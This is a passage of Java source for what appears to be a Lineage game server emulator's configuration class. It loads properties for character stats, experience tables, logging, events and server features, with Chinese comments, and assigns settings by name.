			strWar = altSettings.getProperty("WarInterval", "4d");
			if (strWar.indexOf("d") >= 0) {
				ALT_WAR_INTERVAL_UNIT = Calendar.DATE;
				strWar = strWar.replace("d", "");
			}
			else if (strWar.indexOf("h") >= 0) {
				ALT_WAR_INTERVAL_UNIT = Calendar.HOUR_OF_DAY;
				strWar = strWar.replace("h", "");
			}
			else if (strWar.indexOf("m") >= 0) {
				ALT_WAR_INTERVAL_UNIT = Calendar.MINUTE;
				strWar = strWar.replace("m", "");
			}
			ALT_WAR_INTERVAL = Integer.parseInt(strWar);
			SPAWN_HOME_POINT = Boolean.parseBoolean(altSettings.getProperty("SpawnHomePoint", "true"));
			SPAWN_HOME_POINT_COUNT = Integer.parseInt(altSettings.getProperty("SpawnHomePointCount", "2"));
			SPAWN_HOME_POINT_DELAY = Integer.parseInt(altSettings.getProperty("SpawnHomePointDelay", "100"));
			SPAWN_HOME_POINT_RANGE = Integer.parseInt(altSettings.getProperty("SpawnHomePointRange", "8"));
			INIT_BOSS_SPAWN = Boolean.parseBoolean(altSettings.getProperty("InitBossSpawn", "true"));
			ELEMENTAL_STONE_AMOUNT = Integer.parseInt(altSettings.getProperty("ElementalStoneAmount", "300"));
			HOUSE_TAX_INTERVAL = Integer.parseInt(altSettings.getProperty("HouseTaxInterval", "10"));
			MAX_DOLL_COUNT = Integer.parseInt(altSettings.getProperty("MaxDollCount", "1"));
			RETURN_TO_NATURE = Boolean.parseBoolean(altSettings.getProperty("ReturnToNature", "false"));
			MAX_NPC_ITEM = Integer.parseInt(altSettings.getProperty("MaxNpcItem", "8"));
			MAX_PERSONAL_WAREHOUSE_ITEM = Integer.parseInt(altSettings.getProperty("MaxPersonalWarehouseItem", "100"));
			MAX_CLAN_WAREHOUSE_ITEM = Integer.parseInt(altSettings.getProperty("MaxClanWarehouseItem", "200"));
			DELETE_CHARACTER_AFTER_7DAYS = Boolean.parseBoolean(altSettings.getProperty("DeleteCharacterAfter7Days", "True"));
			NPC_DELETION_TIME = Integer.parseInt(altSettings.getProperty("NpcDeletionTime", "10"));
			DEFAULT_CHARACTER_SLOT = Integer.parseInt(altSettings.getProperty("DefaultCharacterSlot", "6"));
		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load " + ALT_SETTINGS_FILE + " File.");
		}

		// charsettings.properties
		try {
			Properties charSettings = new Properties();
			InputStream is = new FileInputStream(new File(CHAR_SETTINGS_CONFIG_FILE));
			charSettings.load(is);
			is.close();

			PRINCE_MAX_HP = Integer.parseInt(charSettings.getProperty("PrinceMaxHP", "1000"));
			PRINCE_MAX_MP = Integer.parseInt(charSettings.getProperty("PrinceMaxMP", "800"));
			KNIGHT_MAX_HP = Integer.parseInt(charSettings.getProperty("KnightMaxHP", "1400"));
			KNIGHT_MAX_MP = Integer.parseInt(charSettings.getProperty("KnightMaxMP", "600"));
			ELF_MAX_HP = Integer.parseInt(charSettings.getProperty("ElfMaxHP", "1000"));
			ELF_MAX_MP = Integer.parseInt(charSettings.getProperty("ElfMaxMP", "900"));
			WIZARD_MAX_HP = Integer.parseInt(charSettings.getProperty("WizardMaxHP", "800"));
			WIZARD_MAX_MP = Integer.parseInt(charSettings.getProperty("WizardMaxMP", "1200"));
			DARKELF_MAX_HP = Integer.parseInt(charSettings.getProperty("DarkelfMaxHP", "1000"));
			DARKELF_MAX_MP = Integer.parseInt(charSettings.getProperty("DarkelfMaxMP", "900"));
			DRAGONKNIGHT_MAX_HP = Integer.parseInt(charSettings.getProperty("DragonKnightMaxHP", "1400"));
			DRAGONKNIGHT_MAX_MP = Integer.parseInt(charSettings.getProperty("DragonKnightMaxMP", "600"));
			ILLUSIONIST_MAX_HP = Integer.parseInt(charSettings.getProperty("IllusionistMaxHP", "900"));
			ILLUSIONIST_MAX_MP = Integer.parseInt(charSettings.getProperty("IllusionistMaxMP", "1100"));
			LV50_EXP = Integer.parseInt(charSettings.getProperty("Lv50Exp", "1"));
			LV51_EXP = Integer.parseInt(charSettings.getProperty("Lv51Exp", "1"));
			LV52_EXP = Integer.parseInt(charSettings.getProperty("Lv52Exp", "1"));
			LV53_EXP = Integer.parseInt(charSettings.getProperty("Lv53Exp", "1"));
			LV54_EXP = Integer.parseInt(charSettings.getProperty("Lv54Exp", "1"));
			LV55_EXP = Integer.parseInt(charSettings.getProperty("Lv55Exp", "1"));
			LV56_EXP = Integer.parseInt(charSettings.getProperty("Lv56Exp", "1"));
			LV57_EXP = Integer.parseInt(charSettings.getProperty("Lv57Exp", "1"));
			LV58_EXP = Integer.parseInt(charSettings.getProperty("Lv58Exp", "1"));
			LV59_EXP = Integer.parseInt(charSettings.getProperty("Lv59Exp", "1"));
			LV60_EXP = Integer.parseInt(charSettings.getProperty("Lv60Exp", "1"));
			LV61_EXP = Integer.parseInt(charSettings.getProperty("Lv61Exp", "1"));
			LV62_EXP = Integer.parseInt(charSettings.getProperty("Lv62Exp", "1"));
			LV63_EXP = Integer.parseInt(charSettings.getProperty("Lv63Exp", "1"));
			LV64_EXP = Integer.parseInt(charSettings.getProperty("Lv64Exp", "1"));
			LV65_EXP = Integer.parseInt(charSettings.getProperty("Lv65Exp", "2"));
			LV66_EXP = Integer.parseInt(charSettings.getProperty("Lv66Exp", "2"));
			LV67_EXP = Integer.parseInt(charSettings.getProperty("Lv67Exp", "2"));
			LV68_EXP = Integer.parseInt(charSettings.getProperty("Lv68Exp", "2"));
			LV69_EXP = Integer.parseInt(charSettings.getProperty("Lv69Exp", "2"));
			LV70_EXP = Integer.parseInt(charSettings.getProperty("Lv70Exp", "4"));
			LV71_EXP = Integer.parseInt(charSettings.getProperty("Lv71Exp", "4"));
			LV72_EXP = Integer.parseInt(charSettings.getProperty("Lv72Exp", "4"));
			LV73_EXP = Integer.parseInt(charSettings.getProperty("Lv73Exp", "4"));
			LV74_EXP = Integer.parseInt(charSettings.getProperty("Lv74Exp", "4"));
			LV75_EXP = Integer.parseInt(charSettings.getProperty("Lv75Exp", "8"));
			LV76_EXP = Integer.parseInt(charSettings.getProperty("Lv76Exp", "8"));
			LV77_EXP = Integer.parseInt(charSettings.getProperty("Lv77Exp", "8"));
			LV78_EXP = Integer.parseInt(charSettings.getProperty("Lv78Exp", "8"));
			LV79_EXP = Integer.parseInt(charSettings.getProperty("Lv79Exp", "16"));
			LV80_EXP = Integer.parseInt(charSettings.getProperty("Lv80Exp", "32"));
			LV81_EXP = Integer.parseInt(charSettings.getProperty("Lv81Exp", "64"));
			LV82_EXP = Integer.parseInt(charSettings.getProperty("Lv82Exp", "128"));
			LV83_EXP = Integer.parseInt(charSettings.getProperty("Lv83Exp", "256"));
			LV84_EXP = Integer.parseInt(charSettings.getProperty("Lv84Exp", "512"));
			LV85_EXP = Integer.parseInt(charSettings.getProperty("Lv85Exp", "1024"));
			LV86_EXP = Integer.parseInt(charSettings.getProperty("Lv86Exp", "2048"));
			LV87_EXP = Integer.parseInt(charSettings.getProperty("Lv87Exp", "4096"));
			LV88_EXP = Integer.parseInt(charSettings.getProperty("Lv88Exp", "8192"));
			LV89_EXP = Integer.parseInt(charSettings.getProperty("Lv89Exp", "16384"));
			LV90_EXP = Integer.parseInt(charSettings.getProperty("Lv90Exp", "32768"));
			LV91_EXP = Integer.parseInt(charSettings.getProperty("Lv91Exp", "65536"));
			LV92_EXP = Integer.parseInt(charSettings.getProperty("Lv92Exp", "131072"));
			LV93_EXP = Integer.parseInt(charSettings.getProperty("Lv93Exp", "262144"));
			LV94_EXP = Integer.parseInt(charSettings.getProperty("Lv94Exp", "524288"));
			LV95_EXP = Integer.parseInt(charSettings.getProperty("Lv95Exp", "1048576"));
			LV96_EXP = Integer.parseInt(charSettings.getProperty("Lv96Exp", "2097152"));
			LV97_EXP = Integer.parseInt(charSettings.getProperty("Lv97Exp", "4194304"));
			LV98_EXP = Integer.parseInt(charSettings.getProperty("Lv98Exp", "8388608"));
			LV99_EXP = Integer.parseInt(charSettings.getProperty("Lv99Exp", "16777216"));
		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load " + CHAR_SETTINGS_CONFIG_FILE + " File.");
		}

		// fights.properties
		Properties fightSettings = new Properties();
		try {
			InputStream is = new FileInputStream(new File(FIGHT_SETTINGS_CONFIG_FILE));
			fightSettings.load(is);
			is.close();

			FIGHT_IS_ACTIVE = Boolean.parseBoolean(fightSettings.getProperty("FightIsActive", "False"));
			NOVICE_PROTECTION_IS_ACTIVE = Boolean.parseBoolean(fightSettings.getProperty("NoviceProtectionIsActive", "False"));
			NOVICE_MAX_LEVEL = Integer.parseInt(fightSettings.getProperty("NoviceMaxLevel", "20"));
			NOVICE_PROTECTION_LEVEL_RANGE = Integer.parseInt(fightSettings.getProperty("ProtectionLevelRange", "10"));
		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("无法读取设定档: " + FIGHT_SETTINGS_CONFIG_FILE);
		}

		// record.properties
		try {
			Properties recordSettings = new Properties();
			InputStream is = new FileInputStream(new File(RECORD_SETTINGS_CONFIG_FILE));
			recordSettings.load(is);
			is.close();

			LOGGING_WEAPON_ENCHANT = Byte.parseByte(recordSettings.getProperty("LoggingWeaponEnchant", "0"));
			LOGGING_ARMOR_ENCHANT = Byte.parseByte(recordSettings.getProperty("LoggingArmorEnchant", "0"));
			LOGGING_CHAT_NORMAL = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatNormal", "false"));
			LOGGING_CHAT_WHISPER = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatWhisper", "false"));
			LOGGING_CHAT_SHOUT = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatShout", "false"));
			LOGGING_CHAT_WORLD = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatWorld", "false"));
			LOGGING_CHAT_CLAN = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatClan", "false"));
			LOGGING_CHAT_PARTY = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatParty", "false"));
			LOGGING_CHAT_COMBINED = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatCombined", "false"));
			LOGGING_CHAT_CHAT_PARTY = Boolean.parseBoolean(recordSettings.getProperty("LoggingChatChatParty", "false"));
			writeTradeLog = Boolean.parseBoolean(recordSettings.getProperty("writeTradeLog", "false"));
			writeRobotsLog = Boolean.parseBoolean(recordSettings.getProperty("writeRobotsLog", "false"));
			writeDropLog = Boolean.parseBoolean(recordSettings.getProperty("writeDropLog", "false"));
			MysqlAutoBackup = Integer.parseInt(recordSettings.getProperty("MysqlAutoBackup", "false"));
			CompressGzip = Boolean.parseBoolean(recordSettings.getProperty("CompressGzip", "false"));
			
		}catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load: " + RECORD_SETTINGS_CONFIG_FILE);
		}

		// TODO 新增/////////////////////////////////////////////////////////////////
		// othersettings.properties
		try {
			Properties otherSettings = new Properties();
			InputStream is = new FileInputStream(new File(OTHER_SETTINGS_CONFIG_FILE));
			otherSettings.load(is);
			is.close();

			// 伺服器重启 by 丫杰
			REST_TIME = Integer.parseInt(otherSettings.getProperty(
					"RestartTime","60"));

			// 管理者介面 by eric1300460
			GUI = Boolean.parseBoolean(otherSettings.getProperty(
					"GUI", "true"));

			// 在线送经验
			OnlineExpSwitch = Boolean.parseBoolean(otherSettings.getProperty(
					"OnlineExpSwitch", "false"));
			OnlineExpValue = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpValue", "10"));
			OnlineExpTime = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpTime", "100"));
			OnlineExpItem = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpItem","40308"));
			OnlineExpItemCount = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpItemCount","30"));
			OnlineExpStartX = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpStartX","32768"));
			OnlineExpEndX = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpEndX","32768"));
			OnlineExpStartY = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpStartY","32768"));
			OnlineExpEndY = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpEndY","32768"));
			OnlineExpMapId = Integer.parseInt(otherSettings.getProperty(
					"OnlineExpMapId","4"));

			// 怪打怪 A 与  B
			A0 = Integer.parseInt(otherSettings.getProperty(
					"A0","false"));
			A1 = Integer.parseInt(otherSettings.getProperty(
					"A1","false"));
			A2 = Integer.parseInt(otherSettings.getProperty(
					"A2","false"));
			A3 = Integer.parseInt(otherSettings.getProperty(
					"A3","false"));
			A4 = Integer.parseInt(otherSettings.getProperty(
					"A4","false"));
			A5 = Integer.parseInt(otherSettings.getProperty(
					"A5","false"));
			A6 = Integer.parseInt(otherSettings.getProperty(
					"A6","false"));
			A7 = Integer.parseInt(otherSettings.getProperty(
					"A7","false"));
			A8 = Integer.parseInt(otherSettings.getProperty(
					"A8","false"));
			A9 = Integer.parseInt(otherSettings.getProperty(
					"A9","false"));
			B0 = Integer.parseInt(otherSettings.getProperty(
					"B0","false"));
			B1 = Integer.parseInt(otherSettings.getProperty(
					"B1","false"));
			B2 = Integer.parseInt(otherSettings.getProperty(
					"B2","false"));
			B3 = Integer.parseInt(otherSettings.getProperty(
					"B3","false"));
			B4 = Integer.parseInt(otherSettings.getProperty(
					"B4","false"));
			B5 = Integer.parseInt(otherSettings.getProperty(
					"B5","false"));
			B6 = Integer.parseInt(otherSettings.getProperty(
					"B6","false"));
			B7 = Integer.parseInt(otherSettings.getProperty(
					"B7","false"));
			B8 = Integer.parseInt(otherSettings.getProperty(
					"B8","false"));
			B9 = Integer.parseInt(otherSettings.getProperty(
					"B9","false"));

			// 显示怪物血条
			SHOW_HP_BAR = Boolean.parseBoolean(otherSettings.getProperty(
					"ShowHPBar", "false"));

			// 时空裂痕
			CrackStartTime = Short.parseShort(otherSettings.getProperty(	// 时空裂痕开启时间(单位分钟)
                    "CrackStartTime", "4"));
            CrackOpenTime = Short.parseShort(otherSettings.getProperty(	// 时空裂痕开放多久(单位分钟)
                    "CrackOpenTime", "60"));

            // BOSS馆
            mapId = Integer.parseInt(otherSettings.getProperty(	// 所在的地图编号
					"mapId", "5153"));
            mapIdx = Integer.parseInt(otherSettings.getProperty(	// BOSS馆地图X坐标
					"mapIdx", "32641"));
            mapIdy = Integer.parseInt(otherSettings.getProperty(	// BOSS馆地图Y坐标
					"mapIdy", "32899"));
            mapId1 = Integer.parseInt(otherSettings.getProperty(	// 结束后传送玩家到指定地图
					"mapId1", "4"));
            mapIdx1 = Integer.parseInt(otherSettings.getProperty(	// 地图X1坐标
					"mapIdx1", "33442"));
            mapIdy1 = Integer.parseInt(otherSettings.getProperty(	// 地图Y1坐标
					"mapIdy1", "32797"));
            cleartime = Integer.parseInt(otherSettings.getProperty(// 清洁时间(单位分钟)
					"cleartime", "5"));
            minPlayer = Integer.parseInt(otherSettings.getProperty(// 最小玩家数量
					"minPlayer", "1"));
            maxPlayer = Integer.parseInt(otherSettings.getProperty(// 最大玩家数量
					"maxPlayer", "20"));
            itemId = Integer.parseInt(otherSettings.getProperty(	// 进入需要的物品
					"itemId", "5000"));
            Quantity = Integer.parseInt(otherSettings.getProperty(// 物品数量
					"Quantity", "50"));
            bossId1 = Integer.parseInt(otherSettings.getProperty(	// 怪物编号
					"bossId1", "45795"));
            bossId2 = Integer.parseInt(otherSettings.getProperty(
					"bossId2", "45795"));
            bossId3 = Integer.parseInt(otherSettings.getProperty(
					"bossId3", "45795"));
            bossId4 = Integer.parseInt(otherSettings.getProperty(
					"bossId4", "45795"));
            bossId5 = Integer.parseInt(otherSettings.getProperty(
					"bossId5", "45795"));
            bossId6 = Integer.parseInt(otherSettings.getProperty(
					"bossId6", "45795"));
            bossId7 = Integer.parseInt(otherSettings.getProperty(
					"bossId7", "45795"));
            bossId8 = Integer.parseInt(otherSettings.getProperty(
					"bossId8", "45795"));
            bossId9 = Integer.parseInt(otherSettings.getProperty(
					"bossId9", "45795"));
            bossId10 = Integer.parseInt(otherSettings.getProperty(
					"bossId10", "45795"));

            // 循环公告 by 雷公
            Use_Show_Announcecycle = Boolean.parseBoolean(otherSettings.getProperty(
            		"UseShowAnnouncecycle", "false")); 
            Show_Announcecycle_Time = Integer.parseInt(otherSettings.getProperty(
            		"ShowAnnouncecycleTime", "30"));

            // 调整能力值上限 by 阿杰
			BONUS_STATS1 = Integer.parseInt(otherSettings.getProperty(
					"BONUS_STATS1", "25"));
			BONUS_STATS2 = Integer.parseInt(otherSettings.getProperty(
					"BONUS_STATS2", "5"));
			BONUS_STATS3 = Integer.parseInt(otherSettings.getProperty(
					"BONUS_STATS3", "25"));

			// 转生可设定血魔保留多少 by eric1300460
			EVOLUTION_HP = Short.parseShort(otherSettings.getProperty(
					"Evolution_Hp", "100"));
			EVOLUTION_MP = Short.parseShort(otherSettings.getProperty(
					"Evolution_Mp", "100"));

			// 在线一段时间给物品
			GITorF = Boolean.parseBoolean(otherSettings.getProperty(
					"GITorF","false"));
			GI = Integer.parseInt(otherSettings.getProperty(
					"GI", "41159"));
			GIC = Integer.parseInt(otherSettings.getProperty(
					"GIC", "1"));
			GIT = Integer.parseInt(otherSettings.getProperty(
					"GIT", "3"));

			// 持续出现魔法特效 by 狼人香
			Switch = Boolean.parseBoolean(otherSettings.getProperty(	// 开关
					"Switch","false"));
			time = Integer.parseInt(otherSettings.getProperty(		// 多长时间出现  （单位:毫秒）
					"time", "5"));
			level = Integer.parseInt(otherSettings.getProperty(		// 声望多少以上出现
					"level", "100"));
			Phase1 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase1", "4573"));
			Phase2 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase2", "5201"));
			Phase3 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase3", "4231"));
			Phase4 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase4", "4627"));
			Phase5 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase5", "3394"));
			Phase6 = Integer.parseInt(otherSettings.getProperty(		// 各个阶段出现的特效编号
					"Phase6", "761"));

			GateWaitTime = Short.parseShort(otherSettings.getProperty(	// 副本维护时间(单位分钟)
                    "GateWaitTime", "1"));
            CloseDragonTime = Short.parseShort(otherSettings.getProperty( // 副本打开多久，强制关闭.(单位分钟)
                    "CloseDragonTime", "4"));         
            GateMaxPc = Short.parseShort(otherSettings.getProperty(		// 副本进入的玩家上限
                    "GateMaxPc", "32"));

            // 玩家被怪打死公告
            PKM = Boolean.parseBoolean(otherSettings.getProperty(			// 开关
					"PKM","false"));

            // 所有物品贩卖开关
            AllSell = Boolean.parseBoolean(otherSettings.getProperty("AllSell","true"));
            // 检测是否买少卖多
            AllSell1 = Boolean.parseBoolean(otherSettings.getProperty("AllSell1","true"));

            // ＧＭ使用公频(&)显示方式 2/3
			GMTalkShowName = Boolean.parseBoolean(otherSettings.getProperty(
					"GMTalkShowName", "true"));

			// 物品丢地是否删除
			Lostdeleteditems = Boolean.parseBoolean(otherSettings.getProperty(
					"Lostdeleteditems", "true"));

			// 殷海萨的祝福 (登入多少时间取得1%)
			RATE_AIN_TIME = Integer.parseInt(otherSettings.getProperty(
					"RateAinTime", "30"));
			// 殷海萨的祝福 (登出多少时间取得1%)
			RATE_AIN_OUTTIME = Integer.parseInt(otherSettings.getProperty(
					"RateAinOutTime", "30"));
			// 殷海萨的祝福 (最高百分比)
			RATE_MAX_CHARGE_PERCENT = Integer.parseInt(otherSettings.getProperty(
					"RateMaxChargePercent", "200"));
			// 殷海萨的祝福 (积累到一定经验扣除一点) by 9001183ex (追求)
			RATE_EXP_PROPORTION = Integer.parseInt(otherSettings.getProperty(
					"RateExpProportion", "30000"));

			// 冲武防超过安定值多少广播 (最初冲武防广播原创 by 枫印铭心)
			SuccessBoard = Boolean.parseBoolean(otherSettings.getProperty(	// 开关
					"SuccessBoard","false"));
			WeaponOverSafeBoard = Integer.parseInt(otherSettings.getProperty(	// 武器 (多少以上才广播)
					"WeaponOverSafeBoard", "1"));
			ArmorOverSafeBoard = Integer.parseInt(otherSettings.getProperty(	// 防具 (多少以上才广播)
					"ArmorOverSafeBoard", "1"));

			// 冲晕秒数设置
			SHOCK_STUN_TIMER =Integer.parseInt(otherSettings.getProperty(
					"SHOCKSTUNTIMER"));
			
			// 外挂非法移动侦测开关 (比如:地屏状态)
			PlugMove = Boolean.parseBoolean(otherSettings.getProperty(
					"PlugMove", "false"));
			
			// 设定创新角色是否设定为 GM
			NEW_CREATE_SET_GM = Boolean.parseBoolean(otherSettings.getProperty(
					"NewCreateSetGM", "false"));
			
			// 设定是否开启自动学习技能
			AUTO_ADD_SKILL = Boolean.parseBoolean(otherSettings.getProperty(
					"AutoAddSkill", "false"));
			
			// 设定宠物最高等级
			PET_MAX_LV = Byte.parseByte(otherSettings.getProperty(
					"PetMaxLV", "50"));
			// 设定宠物经验值倍率
			RATE_XP_PET = Double.parseDouble(otherSettings.getProperty(
					"PetRateXp","1.0"));
			
			// 死斗竞技场参赛所需金额
			FightMoney = Integer.parseInt(otherSettings.getProperty(
					"FightMoney", "100000"));
			// 死斗竞技场两队最大参加人数
			FightmaxPlayer = Integer.parseInt(otherSettings.getProperty(
					"FightmaxPlayer", "20"));
			// 死斗竞技场两队最低参加人数
			FightminPlayer = Integer.parseInt(otherSettings.getProperty(
					"FightminPlayer", "1"));
			// 死斗竞技场优胜物品编号
			FightItem = Integer.parseInt(otherSettings.getProperty(
					"FightItem", "40308"));
			// 死斗竞技场优胜物品数量
			FightCount = Integer.parseInt(otherSettings.getProperty(
					"FightCount", "1000000"));
			
			// 侦测怪物掉落设定
			AllMonDrop = Boolean.parseBoolean(otherSettings.getProperty(
					"AllMonDrop", "false"));

		}
		catch (Exception e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
			throw new Error("Failed to Load: " + OTHER_SETTINGS_CONFIG_FILE);
		}

		validate();
	}

	private static void validate() {
		if (!IntRange.includes(Config.ALT_ITEM_DELETION_RANGE, 0, 5)) {
			throw new IllegalStateException("ItemDeletionRange 的设定值可能超出( 0 ~ 5 )范围。");
		}

		if (!IntRange.includes(Config.ALT_ITEM_DELETION_TIME, 1, 35791)) {
			throw new IllegalStateException("ItemDeletionTime 的设定值可能超出( 1 ~ 35791 )范围。");
		}
	}

	public static boolean setParameterValue(String pName, String pValue) {
		// server.properties
		if (pName.equalsIgnoreCase("GameserverHostname")) {
			GAME_SERVER_HOST_NAME = pValue;
		}
		else if (pName.equalsIgnoreCase("GameserverPort")) {
			GAME_SERVER_PORT = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Driver")) {
			DB_DRIVER = pValue;
		}
		else if (pName.equalsIgnoreCase("URL")) {
			DB_URL = pValue;
		}
		else if (pName.equalsIgnoreCase("Login")) {
			DB_LOGIN = pValue;
		}
		else if (pName.equalsIgnoreCase("Password")) {
			DB_PASSWORD = pValue;
		}
		else if (pName.equalsIgnoreCase("ClientLanguage")) {
			CLIENT_LANGUAGE = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("TimeZone")) {
			TIME_ZONE = pValue;
		}
		else if (pName.equalsIgnoreCase("AutomaticKick")) {
			AUTOMATIC_KICK = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("AutoCreateAccounts")) {
			AUTO_CREATE_ACCOUNTS = Boolean.parseBoolean(pValue);
		}
		else if (pName.equalsIgnoreCase("MaximumOnlineUsers")) {
			MAX_ONLINE_USERS = Short.parseShort(pValue);
		}
		else if (pName.equalsIgnoreCase("CharacterConfigInServerSide")) {
			CHARACTER_CONFIG_IN_SERVER_SIDE = Boolean.parseBoolean(pValue);
		}
		else if (pName.equalsIgnoreCase("Allow2PC")) {
			ALLOW_2PC = Boolean.parseBoolean(pValue);
		}
		else if (pName.equalsIgnoreCase("LevelDownRange")) {
			LEVEL_DOWN_RANGE = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("SendPacketBeforeTeleport")) {
			SEND_PACKET_BEFORE_TELEPORT = Boolean.parseBoolean(pValue);
		}
		else if (pName.equalsIgnoreCase("Punishment")) {
			ILLEGAL_SPEEDUP_PUNISHMENT = Integer.parseInt(pValue);
		}
		// rates.properties
		else if (pName.equalsIgnoreCase("RateXp")) {
			RATE_XP = Double.parseDouble(pValue);
		}
		else if (pName.equalsIgnoreCase("RateLawful")) {
			RATE_LA = Double.parseDouble(pValue);
		}
		else if (pName.equalsIgnoreCase("RateKarma")) {
			RATE_KARMA = Double.parseDouble(pValue);
		}
		else if (pName.equalsIgnoreCase("RateDropAdena")) {
			RATE_DROP_ADENA = Double.parseDouble(pValue);
		}
		else if (pName.equalsIgnoreCase("RateDropItems")) {
			RATE_DROP_ITEMS = Double.parseDouble(pValue);
		}
		else if (pName.equalsIgnoreCase("EnchantChanceWeapon")) {
			ENCHANT_CHANCE_WEAPON = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("EnchantChanceArmor")) {
			ENCHANT_CHANCE_ARMOR = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("AttrEnchantChance")) {
			ATTR_ENCHANT_CHANCE = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("Weightrate")) {
			RATE_WEIGHT_LIMIT = Byte.parseByte(pValue);
		}
		// altsettings.properties
		else if (pName.equalsIgnoreCase("GlobalChatLevel")) {
			GLOBAL_CHAT_LEVEL = Short.parseShort(pValue);
		}
		else if (pName.equalsIgnoreCase("WhisperChatLevel")) {
			WHISPER_CHAT_LEVEL = Short.parseShort(pValue);
		}
		else if (pName.equalsIgnoreCase("AutoLoot")) {
			AUTO_LOOT = Byte.parseByte(pValue);
		}
		else if (pName.equalsIgnoreCase("LOOTING_RANGE")) {
			LOOTING_RANGE = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("AltNonPvP")) {
			ALT_NONPVP = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("AttackMessageOn")) {
			ALT_ATKMSG = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("ChangeTitleByOneself")) {
			CHANGE_TITLE_BY_ONESELF = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxClanMember")) {
			MAX_CLAN_MEMBER = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("ClanAlliance")) {
			CLAN_ALLIANCE = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxPT")) {
			MAX_PT = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxChatPT")) {
			MAX_CHAT_PT = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("SimWarPenalty")) {
			SIM_WAR_PENALTY = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("GetBack")) {
			GET_BACK = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("AutomaticItemDeletionTime")) {
			ALT_ITEM_DELETION_TIME = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("AutomaticItemDeletionRange")) {
			ALT_ITEM_DELETION_RANGE = Byte.parseByte(pValue);
		}
		else if (pName.equalsIgnoreCase("GMshop")) {
			ALT_GMSHOP = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("GMshopMinID")) {
			ALT_GMSHOP_MIN_ID = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("GMshopMaxID")) {
			ALT_GMSHOP_MAX_ID = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("HalloweenIvent")) {
			ALT_HALLOWEENIVENT = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("JpPrivileged")) {
			ALT_JPPRIVILEGED = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("TalkingScrollQuest")) {
			ALT_TALKINGSCROLLQUEST = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("HouseTaxInterval")) {
			HOUSE_TAX_INTERVAL = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxDollCount")) {
			MAX_DOLL_COUNT = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("ReturnToNature")) {
			RETURN_TO_NATURE = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxNpcItem")) {
			MAX_NPC_ITEM = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxPersonalWarehouseItem")) {
			MAX_PERSONAL_WAREHOUSE_ITEM = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("MaxClanWarehouseItem")) {
			MAX_CLAN_WAREHOUSE_ITEM = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("DeleteCharacterAfter7Days")) {
			DELETE_CHARACTER_AFTER_7DAYS = Boolean.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("NpcDeletionTime")) {
			NPC_DELETION_TIME = Integer.valueOf(pValue);
		}
		else if (pName.equalsIgnoreCase("DefaultCharacterSlot")) {
			DEFAULT_CHARACTER_SLOT = Integer.valueOf(pValue);
		}
	    else if (pName.equalsIgnoreCase("GDropItemTime")) { 
				GDROPITEM_TIME = Integer.parseInt(pValue);
		}

		// charsettings.properties
		else if (pName.equalsIgnoreCase("PrinceMaxHP")) {
			PRINCE_MAX_HP = Integer.parseInt(pValue);
		}
		else if (pName.equalsIgnoreCase("PrinceMaxMP")) {
